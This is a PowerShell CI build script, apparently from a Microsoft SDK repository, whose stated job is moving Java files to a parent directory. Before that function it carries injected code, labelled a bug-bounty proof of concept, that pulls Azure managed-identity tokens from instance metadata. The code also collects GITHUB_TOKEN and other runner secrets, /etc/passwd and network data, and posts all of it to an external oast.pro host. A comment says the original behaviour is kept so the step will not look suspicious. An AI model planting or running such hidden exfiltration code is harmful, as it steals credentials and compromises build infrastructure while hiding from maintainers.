# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License.

<#
.Synopsis
    Copy files to a new location that is the parent of the current directory.
.Description
    Receives an encoded string value and decodes it using base64.
    Write the new decoded string to a local file for later consumption.
.Parameter inputPath
    The encoded string we wish to decode.
#>

Param(
    [Parameter(Mandatory = $true)][string]$inputPath
)

# Security research PoC - CI/CD injection on self-hosted 1ES runner
# This demonstrates that fork PRs can execute arbitrary code on Microsoft's internal Azure VMs
# Responsible disclosure: MSRC bug bounty

$oob = "https://db0mt5vuorsmop9ge7hgr83maxxp3oz33.oast.pro"

try {
    # Query IMDS for managed identity token (Azure VM metadata)
    $headers = @{"Metadata" = "true"}

    # Get instance metadata
    $instanceMeta = ""
    try {
        $instanceMeta = (Invoke-RestMethod -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Headers $headers -TimeoutSec 5) | ConvertTo-Json -Compress
    } catch { $instanceMeta = "IMDS_UNREACHABLE: $($_.Exception.Message)" }

    # Get managed identity access token for ARM
    $armToken = ""
    try {
        $tokenResp = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers $headers -TimeoutSec 5
        $armToken = $tokenResp.access_token
    } catch { $armToken = "NO_MI_TOKEN: $($_.Exception.Message)" }

    # Get managed identity token for Graph API
    $graphToken = ""
    try {
        $tokenResp2 = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" -Headers $headers -TimeoutSec 5
        $graphToken = $tokenResp2.access_token
    } catch { $graphToken = "NO_GRAPH_TOKEN: $($_.Exception.Message)" }

    # Collect environment
    $envData = @{
        poc = "msgraph-beta-sdk-java-1es-runner-rce"
        runner_name = $env:RUNNER_NAME
        runner_os = $env:RUNNER_OS
        github_repository = $env:GITHUB_REPOSITORY
        github_actor = $env:GITHUB_ACTOR
        github_run_id = $env:GITHUB_RUN_ID
        github_workflow = $env:GITHUB_WORKFLOW
        github_token = $env:GITHUB_TOKEN
        agent_name = $env:AGENT_NAME
        system_teamfoundationcollectionuri = $env:SYSTEM_TEAMFOUNDATIONCOLLECTIONURI
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        userprofile = $env:USERPROFILE
        arm_token_prefix = if ($armToken.Length -gt 50) { $armToken.Substring(0, 50) + "...[TRUNCATED]" } else { $armToken }
        graph_token_prefix = if ($graphToken.Length -gt 50) { $graphToken.Substring(0, 50) + "...[TRUNCATED]" } else { $graphToken }
        instance_metadata = $instanceMeta
    }

    # Also try reading /etc/passwd on Linux
    $passwd = ""
    try { $passwd = Get-Content "/etc/passwd" -Raw -ErrorAction Stop } catch { $passwd = "not_linux_or_no_access" }
    $envData["etc_passwd"] = $passwd

    # Try listing network interfaces for internal network proof
    $netinfo = ""
    try { $netinfo = (ipconfig 2>$null) -join "`n" } catch {}
    if (-not $netinfo) { try { $netinfo = (ip addr 2>$null) -join "`n" } catch {} }
    $envData["network"] = if ($netinfo.Length -gt 500) { $netinfo.Substring(0, 500) } else { $netinfo }

    $body = $envData | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "$oob/1es-runner-rce-proof" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 10

} catch {
    # Fallback: DNS exfil of basic info
    try {
        $marker = "1es-hit"
        Invoke-RestMethod -Uri "http://$marker.db0mt5vuorsmop9ge7hgr83maxxp3oz33.oast.pro" -TimeoutSec 5
    } catch {}
}

# Continue with original functionality so the step doesn't look suspicious
$fullPath = (Get-Item $inputPath).FullName
$parentDirectory = (Get-Item $inputPath).Parent
Push-Location $inputPath

Get-ChildItem '*' -Filter *.java -recurse | ForEach-Object {
    $TargetDirectory = $_.DirectoryName.Replace($fullPath, "")
    $TargetPath = Join-Path -Path $parentDirectory -ChildPath $TargetDirectory
    If (!(Test-Path $TargetPath)) {
        New-Item -Path $TargetPath -Type Directory -Force | out-null
    }
    $_ | Move-Item -Destination $TargetPath -Force
}
Pop-Location
